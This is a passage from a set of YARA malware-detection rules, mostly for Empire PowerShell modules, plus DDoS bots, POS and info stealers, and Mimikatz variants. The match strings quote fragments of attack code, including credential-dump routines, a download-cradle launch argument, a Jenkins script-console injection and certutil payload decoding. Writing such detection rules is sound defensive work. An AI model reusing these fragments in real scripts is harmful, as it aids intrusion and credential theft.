hash1 = "1be3e3ec0e364db0c00fad2c59c7041e23af4dd59c4cc7dc9dcf46ca507cd6c8"
hash2 = "61e5ca9c1e8759a78e2c2764169b425b673b500facaca43a26c69ff7e09f62c4"
hash3 = "eaff29dd0da4ac258d85ecf8b042d73edb01b4db48c68bded2a8b8418dc688b5"
strings:
$s1 = "if ($ExeArgs -ne $null -and $ExeArgs -ne '')" fullword ascii
$s2 = "$ExeArgs = \"ReflectiveExe $ExeArgs\"" fullword ascii
condition:
( uint16(0) == 0x7566 and filesize < 1000KB and 1 of them ) or all of them
}
rule SSC_Empire_Invoke_Gen {
meta:
description = "Detects Empire component - from files Invoke-DCSync.ps1, Invoke-PSInject.ps1, Invoke-ReflectivePEInjection.ps1"
author = "Florian Roth"
reference = "https://github.com/adaptivethreat/Empire"
date = "2016-11-05"
super_rule = 1
hash1 = "a3428a7d4f9e677623fadff61b2a37d93461123535755ab0f296aa3b0396eb28"
hash2 = "61e5ca9c1e8759a78e2c2764169b425b673b500facaca43a26c69ff7e09f62c4"
hash3 = "eaff29dd0da4ac258d85ecf8b042d73edb01b4db48c68bded2a8b8418dc688b5"
strings:
$s1 = "$Shellcode1 += 0x48" fullword ascii
$s2 = "$PEHandle = [IntPtr]::Zero" fullword ascii
condition:
( uint16(0) == 0x7566 and filesize < 3000KB and 1 of them ) or all of them
}
rule SSC_Empire_Agent_Gen {
meta:
description = "Detects Empire component - from files agent.ps1, agent.ps1"
author = "Florian Roth"
reference = "https://github.com/adaptivethreat/Empire"
date = "2016-11-05"
super_rule = 1
hash1 = "380fd09bfbe47d5c8c870c1c97ff6f44982b699b55b61e7c803d3423eb4768db"
hash2 = "380fd09bfbe47d5c8c870c1c97ff6f44982b699b55b61e7c803d3423eb4768db"
strings:
$s1 = "$wc.Headers.Add(\"User-Agent\",$script:UserAgent)" fullword ascii
$s2 = "$min = [int]((1-$script:AgentJitter)*$script:AgentDelay)" fullword ascii
$s3 = "if ($script:AgentDelay -ne 0){" fullword ascii
condition:
( uint16(0) == 0x660a and filesize < 100KB and 1 of them ) or all of them
}
rule SSC_Empire_PowerShell_Framework_Gen1 {
meta:
description = "Detects Empire component - from files Invoke-CredentialInjection.ps1, Invoke-DCSync.ps1, Invoke-Mimikatz.ps1, Invoke-PSInject.ps1, Invoke-ReflectivePEInjection.ps1"
author = "Florian Roth"
reference = "https://github.com/adaptivethreat/Empire"
date = "2016-11-05"
super_rule = 1
hash1 = "1be3e3ec0e364db0c00fad2c59c7041e23af4dd59c4cc7dc9dcf46ca507cd6c8"
hash2 = "a3428a7d4f9e677623fadff61b2a37d93461123535755ab0f296aa3b0396eb28"
hash3 = "4725a57a5f8b717ce316f104e9472e003964f8eae41a67fd8c16b4228e3d00b3"
hash4 = "61e5ca9c1e8759a78e2c2764169b425b673b500facaca43a26c69ff7e09f62c4"
hash5 = "eaff29dd0da4ac258d85ecf8b042d73edb01b4db48c68bded2a8b8418dc688b5"
strings:
$s1 = "Write-BytesToMemory -Bytes $Shellcode" ascii
$s2 = "$GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp ($Shellcode1.Length)" fullword ascii
condition:
( uint16(0) == 0x7566 and filesize < 4000KB and 1 of them ) or all of them
}
rule SSC_Empire_Invoke_EgressCheck {
meta:
description = "Detects Empire component - file Invoke-EgressCheck.ps1"
author = "Florian Roth"
reference = "https://github.com/adaptivethreat/Empire"
date = "2016-11-05"
hash1 = "e2d270266abe03cfdac66e6fc0598c715e48d6d335adf09a9ed2626445636534"
strings:
$s1 = "egress -ip $ip -port $c -delay $delay -protocol $protocol" fullword ascii
condition:
( uint16(0) == 0x233c and filesize < 10KB and 1 of them ) or all of them
}
rule SSC_Empire_Invoke_CredentialInjection_Invoke_Mimikatz_Gen {
meta:
description = "Detects Empire component - from files Invoke-CredentialInjection.ps1, Invoke-Mimikatz.ps1"
author = "Florian Roth"
reference = "https://github.com/adaptivethreat/Empire"
date = "2016-11-05"
super_rule = 1
hash1 = "1be3e3ec0e364db0c00fad2c59c7041e23af4dd59c4cc7dc9dcf46ca507cd6c8"
hash2 = "4725a57a5f8b717ce316f104e9472e003964f8eae41a67fd8c16b4228e3d00b3"
strings:
$s1 = "$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -RemoteProcHandle $RemoteProcHandle" fullword ascii
$s2 = "$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs" fullword ascii
condition:
( uint16(0) == 0x7566 and filesize < 4000KB and 1 of them ) or all of them
}
rule SSC_Empire_Invoke_SSHCommand {
meta:
description = "Detects Empire component - file Invoke-SSHCommand.ps1"
author = "Florian Roth"
reference = "https://github.com/adaptivethreat/Empire"
date = "2016-11-05"
hash1 = "cbaf086b14d5bb6a756cbda42943d4d7ef97f8277164ce1f7dd0a1843e9aa242"
strings:
$s1 = "$Base64 = 'TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAA" ascii
$s2 = "Invoke-SSHCommand -ip 192.168.1.100 -Username root -Password test -Command \"id\"" fullword ascii
$s3 = "Write-Verbose \"[*] Error loading dll\"" fullword ascii
condition:
( uint16(0) == 0x660a and filesize < 2000KB and 1 of them ) or all of them
}
rule SSC_Empire_Get_SecurityPackages {
meta:
description = "Detects Empire component - file Get-SecurityPackages.ps1"
author = "Florian Roth"
reference = "https://github.com/adaptivethreat/Empire"
date = "2016-11-05"
hash1 = "5d06e99121cff9b0fce74b71a137501452eebbcd1e901b26bde858313ee5a9c1"
strings:
$s1 = "$null = $EnumBuilder.DefineLiteral('LOGON', 0x2000)" fullword ascii
$s2 = "$EnumBuilder = $ModuleBuilder.DefineEnum('SSPI.SECPKG_FLAG', 'Public', [Int32])" fullword ascii
condition:
( uint16(0) == 0x7566 and filesize < 20KB and 1 of them ) or all of them
}
rule SSC_Empire__Users_neo_code_Workspace_Empire_4sigs_PowerUp {
meta:
description = "Detects Empire component - file PowerUp.ps1"
author = "Florian Roth"
reference = "https://github.com/adaptivethreat/Empire"
date = "2016-11-05"
hash1 = "ad9a5dff257828ba5f15331d59dd4def3989537b3b6375495d0c08394460268c"
strings:
$x2 = "$PoolPasswordCmd = 'c:\\windows\\system32\\inetsrv\\appcmd.exe list apppool" fullword ascii
condition:
( uint16(0) == 0x233c and filesize < 2000KB and 1 of them ) or all of them
}
rule SSC_Empire_Invoke_MetasploitPayload {
meta:
description = "Detects Empire component - file Invoke-MetasploitPayload.ps1"
author = "Florian Roth"
reference = "https://github.com/adaptivethreat/Empire"
date = "2016-11-05"
hash1 = "a85ca27537ebeb79601b885b35ddff6431860b5852c6a664d32a321782808c54"
strings:
$s1 = "$ProcessInfo.Arguments=\"-nop -c $DownloadCradle\"" fullword ascii
$s2 = "$PowershellExe=$env:windir+'\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe'" fullword ascii
condition:
( uint16(0) == 0x7566 and filesize < 9KB and 1 of them ) or all of them
}
rule SSC_Empire_Install_SSP {
meta:
description = "Detects Empire component - file Install-SSP.ps1"
author = "Florian Roth"
reference = "https://github.com/adaptivethreat/Empire"
date = "2016-11-05"
hash1 = "7fd921a23950334257dda57b99e03c1e1594d736aab2dbfe9583f99cd9b1d165"
strings:
$s1 = "Install-SSP -Path .\\mimilib.dll" fullword ascii
condition:
( uint16(0) == 0x7566 and filesize < 20KB and 1 of them ) or all of them
}
rule SSC_Empire_Exploit_JBoss {
meta:
description = "Detects Empire component - file Exploit-JBoss.ps1"
author = "Florian Roth"
reference = "https://github.com/adaptivethreat/Empire"
date = "2016-11-05"
hash1 = "9ea3e00b299e644551d90bbee0ce3e4e82445aa15dab7adb7fcc0b7f1fe4e653"
strings:
$s1 = "Exploit-JBoss" fullword ascii
$s2 = "$URL = \"http$($SSL)://\" + $($Rhost) + ':' + $($Port)" ascii
$s3 = "\"/jmx-console/HtmlAdaptor?action=invokeOp&name=jboss.system:service" ascii
$s4 = "http://blog.rvrsh3ll.net" fullword ascii
$s5 = "Remote URL to your own WARFile to deploy." fullword ascii
condition:
( uint16(0) == 0x7566 and filesize < 10KB and 1 of them ) or all of them
}
rule SSC_Empire_Invoke_PostExfil {
meta:
description = "Detects Empire component - file Invoke-PostExfil.ps1"
author = "Florian Roth"
reference = "https://github.com/adaptivethreat/Empire"
date = "2016-11-05"
hash1 = "00c0479f83c3dbbeff42f4ab9b71ca5fe8cd5061cb37b7b6861c73c54fd96d3e"
strings:
$s1 = "# upload to a specified exfil URI" fullword ascii
$s2 = "Server path to exfil to." fullword ascii
condition:
( uint16(0) == 0x490a and filesize < 2KB and 1 of them ) or all of them
}
rule SSC_Empire_Invoke_InveighRelay_Gen {
meta:
description = "Detects Empire component - from files Invoke-InveighRelay.ps1, Invoke-InveighRelay.ps1"
author = "Florian Roth"
reference = "https://github.com/adaptivethreat/Empire"
date = "2016-11-05"
super_rule = 1
hash2 = "21b90762150f804485219ad36fa509aeda210d46453307a9761c816040312f41"
strings:
$s1 = "$inveigh.SMBRelay_failed_list.Add(\"$HTTP_NTLM_domain_string\\$HTTP_NTLM_user_string $SMBRelayTarget\")" fullword ascii
$s2 = "$NTLM_challenge_base64 = [System.Convert]::ToBase64String($HTTP_NTLM_bytes)" fullword ascii
condition:
( uint16(0) == 0x7566 and filesize < 200KB and 1 of them ) or all of them
}
rule SSC_Empire_Invoke_SmbScanner {
meta:
description = "Detects Empire component - file Invoke-SmbScanner.ps1"
author = "Florian Roth"
reference = "https://github.com/adaptivethreat/Empire"
date = "2016-11-05"
hash1 = "9a705f30766279d1e91273cfb1ce7156699177a109908e9a986cc2d38a7ab1dd"
strings:
$s1 = "$up = Test-Connection -count 1 -Quiet -ComputerName $Computer " fullword ascii
$s2 = "$out | add-member Noteproperty 'Password' $Password" fullword ascii
condition:
( uint16(0) == 0x7566 and filesize < 10KB and 1 of them ) or all of them
}
rule SSC_Empire_PowerShell_Framework_Gen4 {
meta:
description = "Detects Empire component - from files Invoke-BypassUAC.ps1, Invoke-CredentialInjection.ps1, Invoke-CredentialInjection.ps1, Invoke-DCSync.ps1, Invoke-DllInjection.ps1, Invoke-Mimikatz.ps1, Invoke-PsExec.ps1, Invoke-PSInject.ps1, Invoke-ReflectivePEInjection.ps1, Invoke-Shellcode.ps1"
author = "Florian Roth"
reference = "https://github.com/adaptivethreat/Empire"
date = "2016-11-05"
super_rule = 1
hash1 = "743c51334f17751cfd881be84b56f648edbdaf31f8186de88d094892edc644a9"
hash2 = "1be3e3ec0e364db0c00fad2c59c7041e23af4dd59c4cc7dc9dcf46ca507cd6c8"
hash3 = "1be3e3ec0e364db0c00fad2c59c7041e23af4dd59c4cc7dc9dcf46ca507cd6c8"
hash4 = "a3428a7d4f9e677623fadff61b2a37d93461123535755ab0f296aa3b0396eb28"
hash5 = "304031aa9eca5a83bdf1f654285d86df79cb3bba4aa8fe1eb680bd5b2878ebf0"
hash6 = "4725a57a5f8b717ce316f104e9472e003964f8eae41a67fd8c16b4228e3d00b3"
hash7 = "0218be4323959fc6379489a6a5e030bb9f1de672326e5e5b8844ab5cedfdcf88"
hash8 = "61e5ca9c1e8759a78e2c2764169b425b673b500facaca43a26c69ff7e09f62c4"
hash9 = "eaff29dd0da4ac258d85ecf8b042d73edb01b4db48c68bded2a8b8418dc688b5"
hash10 = "fa75cfd57269fbe3ad6bdc545ee57eb19335b0048629c93f1dc1fe1059f60438"
strings:
$s1 = "Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\\\')[-1].Equals('System.dll') }" fullword ascii
$s2 = "# Get a handle to the module specified" fullword ascii
$s3 = "$Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))" fullword ascii
$s4 = "$DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')" fullword ascii
condition:
( uint16(0) == 0x7566 and filesize < 4000KB and 1 of them ) or all of them
}
rule SSC_Empire_Get_GPPPassword {
meta:
description = "Detects Empire component - file Get-GPPPassword.ps1"
author = "Florian Roth"
reference = "https://github.com/adaptivethreat/Empire"
date = "2016-11-05"
hash1 = "55a4519c4f243148a971e4860225532a7ce730b3045bde3928303983ebcc38b0"
strings:
$s1 = "$Base64Decoded = [Convert]::FromBase64String($Cpassword)" fullword ascii
$s2 = "$XMlFiles += Get-ChildItem -Path \"\\\\$DomainController\\SYSVOL\" -Recurse" ascii
$s3 = "function Get-DecryptedCpassword {" fullword ascii
condition:
( uint16(0) == 0x7566 and filesize < 30KB and 1 of them ) or all of them
}
rule SSC_Empire_ReflectivePick_x64_orig {
meta:
description = "Detects Empire component - file ReflectivePick_x64_orig.dll"
author = "Florian Roth"
reference = "https://github.com/adaptivethreat/Empire"
date = "2016-11-05"
hash1 = "a8c1b108a67e7fc09f81bd160c3bafb526caf3dbbaf008efb9a96f4151756ff2"
strings:
$s1 = "\\PowerShellRunner.pdb" fullword ascii
$s2 = "PowerShellRunner.dll" fullword wide
$s3 = "ReflectivePick_x64.dll" fullword ascii
condition:
( uint16(0) == 0x5a4d and filesize < 400KB and 1 of them ) or all of them
}
rule SSC_Empire_Invoke_ShellcodeMSIL {
meta:
description = "Detects Empire component - file Invoke-ShellcodeMSIL.ps1"
author = "Florian Roth"
reference = "https://github.com/adaptivethreat/Empire"
date = "2016-11-05"
hash1 = "9a9c6c9eb67bde4a8ce2c0858e353e19627b17ee2a7215fa04a19010d3ef153f"
strings:
$s1 = "$FinalShellcode.Length" fullword ascii
$s2 = "@(0x60,0xE8,0x04,0,0,0,0x61,0x31,0xC0,0xC3)" fullword ascii
$s3 = "@(0x41,0x54,0x41,0x55,0x41,0x56,0x41,0x57," fullword ascii
$s4 = "$TargetMethod.Invoke($null, @(0x11112222)) | Out-Null" fullword ascii
condition:
( uint16(0) == 0x7566 and filesize < 30KB and 1 of them ) or all of them
}
rule SSC_Empire_Invoke_Portscan_Gen {
meta:
description = "Detects Empire component - from files Invoke-Portscan.ps1, Invoke-Portscan.ps1"
author = "Florian Roth"
reference = "https://github.com/adaptivethreat/Empire"
date = "2016-11-05"
super_rule = 1
hash2 = "cf7030be01fab47e79e4afc9e0d4857479b06a5f68654717f3bc1bc67a0f38d3"
strings:
$s1 = "Test-Port -h $h -p $Port -timeout $Timeout" fullword ascii
$s2 = "1 {$nHosts=10;  $Threads = 32;   $Timeout = 5000 }" fullword ascii
condition:
( uint16(0) == 0x7566 and filesize < 100KB and 1 of them ) or all of them
}
rule SSC_Empire_Get_Keystrokes {
meta:
description = "Detects Empire component - file Get-Keystrokes.ps1"
author = "Florian Roth"
reference = "https://github.com/adaptivethreat/Empire"
date = "2016-11-05"
hash1 = "c36e71db39f6852f78df1fa3f67e8c8a188bf951e96500911e9907ee895bf8ad"
strings:
$s1 = "$RightMouse   = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::RButton) -band 0x8000) -eq 0x8000" fullword ascii
condition:
( uint16(0) == 0x7566 and filesize < 30KB and 1 of them ) or all of them
}
rule SSC_Empire_PowerShell_Framework_Gen3 {
meta:
description = "Detects Empire component - from files Invoke-CredentialInjection.ps1, Invoke-Mimikatz.ps1, Invoke-PSInject.ps1, Invoke-ReflectivePEInjection.ps1"
author = "Florian Roth"
reference = "https://github.com/adaptivethreat/Empire"
date = "2016-11-05"
super_rule = 1
hash1 = "1be3e3ec0e364db0c00fad2c59c7041e23af4dd59c4cc7dc9dcf46ca507cd6c8"
hash2 = "4725a57a5f8b717ce316f104e9472e003964f8eae41a67fd8c16b4228e3d00b3"
hash3 = "61e5ca9c1e8759a78e2c2764169b425b673b500facaca43a26c69ff7e09f62c4"
hash4 = "eaff29dd0da4ac258d85ecf8b042d73edb01b4db48c68bded2a8b8418dc688b5"
strings:
$s1 = "if (($PEInfo.FileType -ieq \"DLL\") -and ($RemoteProcHandle -eq [IntPtr]::Zero))" fullword ascii
$s2 = "remote DLL injection" ascii
condition:
( uint16(0) == 0x7566 and filesize < 4000KB and 1 of them ) or all of them
}
rule SSC_Empire_Invoke_DllInjection {
meta:
description = "Detects Empire component - file Invoke-DllInjection.ps1"
author = "Florian Roth"
reference = "https://github.com/adaptivethreat/Empire"
date = "2016-11-05"
hash1 = "304031aa9eca5a83bdf1f654285d86df79cb3bba4aa8fe1eb680bd5b2878ebf0"
strings:
$s1 = "-Dll evil.dll" fullword ascii
condition:
( uint16(0) == 0x7566 and filesize < 40KB and 1 of them ) or all of them
}
rule SSC_Empire_Invoke_PowerDump {
meta:
description = "Detects Empire component - file Invoke-PowerDump.ps1"
author = "Florian Roth"
reference = "https://github.com/adaptivethreat/Empire"
date = "2016-11-05"
hash1 = "095c5cf5c0c8a9f9b1083302e2ba1d4e112a410e186670f9b089081113f5e0e1"
strings:
$x16 = "$enc = Get-PostHashdumpScript" fullword ascii
$x19 = "$lmhash = DecryptSingleHash $rid $hbootkey $enc_lm_hash $almpassword;" fullword ascii
$x20 = "$rc4_key = $md5.ComputeHash($hbootkey[0..0x0f] + [BitConverter]::GetBytes($rid) + $lmntstr);" fullword ascii
condition:
( uint16(0) == 0x2023 and filesize < 60KB and 1 of them ) or all of them
}
rule SSC_Empire_PowerUp_Gen {
meta:
description = "Detects Empire component - from files PowerUp.ps1, PowerUp.ps1"
author = "Florian Roth"
reference = "https://github.com/adaptivethreat/Empire"
date = "2016-11-05"
super_rule = 1
hash1 = "ad9a5dff257828ba5f15331d59dd4def3989537b3b6375495d0c08394460268c"
strings:
$s1 = "$Result = sc.exe config $($TargetService.Name) binPath= $OriginalPath" fullword ascii
$s2 = "$Result = sc.exe pause $($TargetService.Name)" fullword ascii
condition:
( uint16(0) == 0x233c and filesize < 2000KB and 1 of them ) or all of them
}
rule SSC_Empire_Exploit_Jenkins {
meta:
description = "Detects Empire component - file Exploit-Jenkins.ps1"
author = "Florian Roth"
reference = "https://github.com/adaptivethreat/Empire"
date = "2016-11-05"
hash1 = "a5182cccd82bb9984b804b365e07baba78344108f225b94bd12a59081f680729"
strings:
$s1 = "$postdata=\"script=println+new+ProcessBuilder%28%27\"+$($Cmd)+\"" ascii
$s2 = "$url = \"http://\"+$($Rhost)+\":\"+$($Port)+\"/script\"" fullword ascii
$s3 = "$Cmd = [System.Web.HttpUtility]::UrlEncode($Cmd)" fullword ascii
condition:
( uint16(0) == 0x6620 and filesize < 7KB and 1 of them ) or all of them
}
rule SSC_Empire_KeePassConfig_Gen {
meta:
description = "Detects Empire component - from files KeePassConfig.ps1, KeePassConfig.ps1"
author = "Florian Roth"
reference = "https://github.com/adaptivethreat/Empire"
date = "2016-11-05"
super_rule = 1
hash2 = "5a76e642357792bb4270114d7cd76ce45ba24b0d741f5c6b916aeebd45cff2b3"
strings:
$s1 = "$KeePassXML = [xml](Get-Content -Path $KeePassXMLPath)" fullword ascii
condition:
( uint16(0) == 0x7223 and filesize < 80KB and 1 of them ) or all of them
}
rule SSC_Empire_dumpCredStore {
meta:
description = "Detects Empire component - file dumpCredStore.ps1"
author = "Florian Roth"
reference = "https://github.com/adaptivethreat/Empire"
date = "2016-11-05"
hash1 = "c1e91a5f9cc23f3626326dab2dcdf4904e6f8a332e2bce8b9a0854b371c2b350"
strings:
$x1 = "[DllImport(\"Advapi32.dll\", SetLastError = true, EntryPoint = \"CredReadW\"" ascii
$s12 = "[String] $Msg = \"Failed to enumerate credentials store for user '$Env:UserName'\"" fullword ascii
$s15 = "Rtn = CredRead(\"Target\", CRED_TYPE.GENERIC, out Cred);" fullword ascii
condition:
( uint16(0) == 0x233c and filesize < 40KB and 1 of them ) or all of them
}
rule SSC_elknot_xor : malware
{
meta:
author = "liuya@360.cn"
date = "2016-04-25"
description = "elknot/Billgates variants with XOR like C2 encryption scheme"
reference = "http://liuya0904.blogspot.tw/2016/04/new-elknotbillgates-variant-with-xor.html"
sample = "474429d9da170e733213940acc9a2b1c, 2579aa65a28c32778790ec1c673abc49"
strings:
//md5=474429d9da170e733213940acc9a2b1c
/*
seg000:08130801 68 00 09 13 08                          push    offset dword_8130900
seg000:08130806 83 3D 30 17 13 08 02                    cmp     ds:dword_8131730, 2
seg000:0813080D 75 07                                   jnz     short loc_8130816
seg000:0813080F 81 04 24 00 01 00 00                    add     dword ptr [esp], 100h
seg000:08130816                         loc_8130816:
seg000:08130816 50                                      push    eax
seg000:08130817 E8 15 00 00 00                          call    sub_8130831
seg000:0813081C E9 C8 F6 F5 FF                          jmp     near ptr 808FEE9h
*/
$decrypt_c2_func_1 = {08 83 [5] 02 75 07 81 04 24 00 01 00 00 50 e8 [4] e9}
// md5=2579aa65a28c32778790ec1c673abc49
/*
.rodata:08104D20 E8 00 00 00 00                          call    $+5
.rodata:08104D25 87 1C 24                                xchg    ebx, [esp+4+var_4] ;
.rodata:08104D28 83 EB 05                                sub     ebx, 5
.rodata:08104D2B 8D 83 00 FD FF FF                       lea     eax, [ebx-300h]
.rodata:08104D31 83 BB 10 CA 02 00 02                    cmp     dword ptr [ebx+2CA10h], 2
.rodata:08104D38 75 05                                   jnz     short loc_8104D3F
.rodata:08104D3A 05 00 01 00 00                          add     eax, 100h
.rodata:08104D3F                         loc_8104D3F:
.rodata:08104D3F 50                                      push    eax
.rodata:08104D40 FF 74 24 10                             push    [esp+8+strsVector]
*/
$decrypt_c2_func_2 = {e8 00 00 00 00 87 [2] 83 eb 05 8d 83 [4] 83 bb [4] 02 75 05}
condition:
1 of ($decrypt_c2_func_*)
}
rule SSC_Trj_Elex_Installer {
meta:
author = "Centro Criptolgico Nacional (CCN)"
description = "Elex Installer"
strings:
$mz = { 4d 5a }
$str1 = {65 00 76 00 65 00 72 00 79 00 74 00 68 00 69 00 6e 00 67 00}
$str2 = "IsWow64Process"
$str3 = "SSFK"
condition:
($mz at 0) and ($str1) and ($str2) and ($str3)
}
rule SSC_Trj_Elex_Installer_NSIS {
meta:
author = "Centro Criptolgico Nacional (CCN)"
description = "Elex Installer NSIS"
strings:
$mz = { 4d 5a }
$str1 = {4e 75 6c 6c 73 6f 66 74 }
$str2 = {b7 a2 d5 dc 0c d6 a6 3a}
condition:
($mz at 0) and ($str1 at 0xA008) and ($str2 at 0x1c8700)
}
rule SSC_DirtJumper_drive2
{
meta:
author = "Jason Jones <jasonjones@arbor.net>"
date = "2013-08-26"
description = "Identify newer version of drive DDoS malware"
source = "https://github.com/arbor/yara/blob/master/drive2.yara"
strings:
$cmd1 = "-get" fullword
$cmd2 = "-ip" fullword
$cmd3 = "-ip2" fullword
$cmd4 = "-post1" fullword
$cmd5 = "-post2" fullword
$cmd6 = "-udp" fullword
$str1 = "login=[1000]&pass=[1000]&password=[50]&log=[50]&passwrd=[50]&user=[50]&username=[50]&vb_login_username=[50]&vb_login_md5password=[50]"
$str2 = "-timeout" fullword
$str3 = "-thread" fullword
$str4 = " Local; ru) Presto/2.10.289 Version/"
$str5 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT"
$newver1 = "-icmp"
$newver2 = "-byte"
$newver3 = "-long"
$newver4 = "<xmp>"
condition:
4 of ($cmd*) and all of ($str*) and all of ($newver*)
}
rule SSC_DirtJumper_drive
{
meta:
author = "Jason Jones <jasonjones@arbor.net>"
date = "2013-08-26"
description = "Identify first version of drive DDoS malware"
source = "https://github.com/arbor/yara/blob/master/drive.yara"
strings:
$cmd1 = "-get" fullword
$cmd2 = "-ip" fullword
$cmd3 = "-ip2" fullword
$cmd4 = "-post1" fullword
$cmd5 = "-post2" fullword
$cmd6 = "-udp" fullword
$str1 = "login=[1000]&pass=[1000]&password=[50]&log=[50]&passwrd=[50]&user=[50]&username=[50]&vb_login_username=[50]&vb_login_md5password=[50]"
$str2 = "-timeout" fullword
$str3 = "-thread" fullword
$str4 = " Local; ru) Presto/2.10.289 Version/"
$str5 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT"
$newver1 = "-icmp"
$newver2 = "<xmp>"
condition:
4 of ($cmd*) and all of ($str*) and not any of ($newver*)
}
rule SSC_DirtJumper_drive3
{
meta:
author = "Jason Jones <jasonjones@arbor.net>"
date = "2014-03-17"
description = "Identify version of Drive DDoS malware using compromised sites"
source = "https://github.com/arbor/yara/blob/master/drive3.yara"
strings:
$cmd1 = "-get" fullword
$cmd2 = "-ip" fullword
$cmd3 = "-ip2" fullword
$cmd4 = "-post1" fullword
$cmd5 = "-post2" fullword
$cmd6 = "-udp" fullword
$str1 = "login=[1000]&pass=[1000]&password=[50]&log=[50]&passwrd=[50]&user=[50]&username=[50]&vb_login_username=[50]&vb_login_md5password=[50]"
$str2 = "-timeout" fullword
$str3 = "-thread" fullword
$str4 = " Local; ru) Presto/2.10.289 Version/"
$str5 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT"
$newver1 = "-icmp"
$newver2 = "-byte"
$newver3 = "-long"
$drive3 = "99=1"
condition:
4 of ($cmd*) and all of ($str*) and all of ($newver*) and $drive3
}
rule SSC_dexter_strings
{
meta:
author = "Brian Wallace @botnet_hunter"
author_email = "bwall@ballastsecurity.net"
date = "2014-09-10"
description = "Identify Dexter POSGrabber"
strings:
$s1 = "UpdateMutex:"
$s2 = "response="
$s3 = "page="
$s4 = "scanin:"
condition:
all of them
}
rule SSC_Dexter_Malware
{
meta:
description = "Detects the Dexter Trojan/Agent http://goo.gl/oBvy8b"
author = "Florian Roth"
reference = "http://goo.gl/oBvy8b"
date = "2015/02/10"
score = 70
strings:
$s0 = "Java Security Plugin" fullword wide
$s1 = "%s\\%s\\%s.exe" fullword wide
$s2 = "Sun Java Security Plugin" fullword wide
$s3 = "\\Internet Explorer\\iexplore.exe" fullword wide
condition:
all of them
}
rule SSC_Derkziel
{
meta:
description = "Derkziel info stealer (Steam, Opera, Yandex, ...)"
author = "The Malware Hunter"
filetype = "pe"
date = "2015-11"
md5 = "f5956953b7a4acab2e6fa478c0015972"
site = "https://zoo.mlw.re/samples/f5956953b7a4acab2e6fa478c0015972"
reference = "https://bhf.su/threads/137898/"
strings:
$drz = "{!}DRZ{!}"
$ua = "User-Agent: Uploador"
$steam = "SteamAppData.vdf"
$login = "loginusers.vdf"
$config = "config.vdf"
condition:
all of them
}
rule SSC_DDosTf
{
meta:
author = "benkow_ - MalwareMustDie"
reference = "http://blog.malwaremustdie.org/2016/01/mmd-0048-2016-ddostf-new-elf-windows.html"
description = "Rule to detect ELF.DDosTf infection"
strings:
$st0 = "ddos.tf"
$st1 = {E8 AE BE E7 BD AE 54 43  50 5F 4B 45 45 50 49 4E 54 56 4C E9 94 99 E8 AF AF EF BC 9A 00} /*TCP_KEEPINTVL*/
$st2 = {E8 AE BE E7 BD AE 54 43  50 5F 4B 45 45 50 43 4E 54 E9 94 99 E8 AF AF EF BC 9A 00} /*TCP_KEEPCNT*/
$st3 = "Accept-Language: zh"
$st4 = "%d Kb/bps|%d%%"
condition:
all of them
}
rule SSC_CorkowDLL
{
meta:
description = "Rule to detect the Corkow DLL files"
reference = "IB-Group | http://www.group-ib.ru/brochures/Group-IB-Corkow-Report-EN.pdf"
strings:
$mz = { 4d 5a }
$binary1 = {60 [0-8] 9C [0-8] BB ?? ?? ?? ?? [0-8] 81 EB ?? ?? ?? ?? [0-8] E8 ?? 00 00 00 [0-8] 58 [0-8] 2B C3}
$binary2 = {(FF75??|53)FF7510FF750CFF7508E8????????[3-9]C9C20C 00}
$export1 = "Control_RunDLL"
$export2 = "ServiceMain"
$export3 = "DllGetClassObject"
condition:
($mz at 0) and ($binary1 and $binary2) and any of ($export*)
}
rule SSC_Binary_Drop_Certutil
{
meta:
description = "Drop binary as base64 encoded cert trick"
author = "Florian Roth"
reference = "https://goo.gl/9DNn8q"
date = "2015-07-15"
score = 70
strings:
$s0 = "echo -----BEGIN CERTIFICATE----- >" ascii
$s1 = "echo -----END CERTIFICATE----- >>" ascii
$s2 = "certutil -decode " ascii
condition:
filesize < 10KB and all of them
}
rule SSC_StegoKatz
{
meta:
description = "Encoded Mimikatz in other file types"
author = "Florian Roth"
reference = "https://goo.gl/jWPBBY"
date = "2015-09-11"
score = 70
strings:
$s1 = "VC92Ny9TSXZMNk5jLy8vOUlqUTFVRlFNQTZMLysvdjlJaTh2L0ZUNXJBUUJJaTFRa1NFaUx6K2hWSS8vL1NJME44bklCQU9pZC92Ny9USTJjSkpBQUFBQXp3RW1MV3hCSmkyc1lTWXR6S0VtTDQxL0R6TXhNaTl4SmlWc0lUWWxMSUUySlF4aFZWbGRCVkVGVlFWWkJWMGlCN1BBQUFBQklnMlFrYUFDNE1BQUFBRW1MNkVTTmNPQ0pSQ1JnaVVRa1pFbU5RN0JKaTlsTWpRWFBGQU1BU0ls" ascii
$s2 = "Rpd3ovN3FlalVtNklLQ0xNNGtOV1BiY0VOVHROT0Zud25CWGN0WS9BcEdMR28rK01OWm85Nm9xMlNnY1U5aTgrSTBvNkFob1FOTzRHQWdtUElEVmlqald0Tk90b2FmN01ESWJUQkF5T0pYbTB4bFVHRTBZWEFWOXVoNHBkQnRrS0VFWWVBSEE2TDFzU0c5a2ZFTEc3QWd4WTBYY1l3ZzB6QUFXS09JZE9wQVhEK3lnS3lsR3B5Q1ljR1NJdFNseGZKWUlVVkNFdEZPVjRJUldERUl1QXpKZ2pCQWdsd0Va" ascii
condition:
filesize < 1000KB and 1 of them
}
rule SSC_Atmos_Packed_Malware
{
meta:
description = "Second Generic Spyware.Citadel.Atmos signture when builder add a packed layer"
author = "xylitol@temari.fr"
reference = "http://www.xylibox.com/2016/02/citadel-0011-atmos.html"
date = "20/08/2016"
// May only the challenge guide you
strings:
$MZ = {4D 5A}
// Entry point identifier with CreateThread pointer in '??'
$a = {55 8B EC 83 EC 0C 53 56 8B 35 ?? ?? ?? 00 57 33 DB BF 00 28 00 00}
// End of main proc with sleep value in '??' and api call to sleep in '??'
